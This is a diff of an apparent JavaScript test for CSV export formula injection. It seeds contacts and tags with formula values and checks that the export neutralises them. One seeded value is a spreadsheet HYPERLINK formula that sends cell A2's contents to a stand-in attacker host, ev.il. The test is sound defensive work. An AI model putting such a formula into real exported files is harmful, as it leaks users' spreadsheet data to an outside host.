@@ -136,7 +136,8 @@ describe('CSV export formulas (#30, #59)', () => {
   it('exports source, tags, custom fields and names without live formulas in ; or , separated readers', async () => {
     const c = (await env.api('POST', '/api/contacts', { phone: '5255888002', name: 'Ana;=1+1;', custom_fields: { nota: 'x;=3+3' } })).body.contact;
     const t1 = (await env.api('POST', '/api/tags', { name: 'Aaa' })).body.tag;
-    const t2 = (await env.api('POST', '/api/tags', { name: '=2+3;' })).body.tag;
+    // A ';' is no longer accepted in a tag name: a tag created before that rule.
+    const t2 = (await q(`INSERT INTO tags (workspace_id, name) VALUES ($1, '=2+3;') RETURNING *`, [ws])).rows[0];
     await env.api('PATCH', `/api/contacts/${c.id}`, { tag_ids: [t1.id, t2.id] });
     await q(`UPDATE contacts SET source = $2 WHERE id = $1`, [c.id, '=HYPERLINK("http://ev.il/?"&A2,"Ver")']);
     const r = await env.api('GET', '/api/contacts/export.csv');
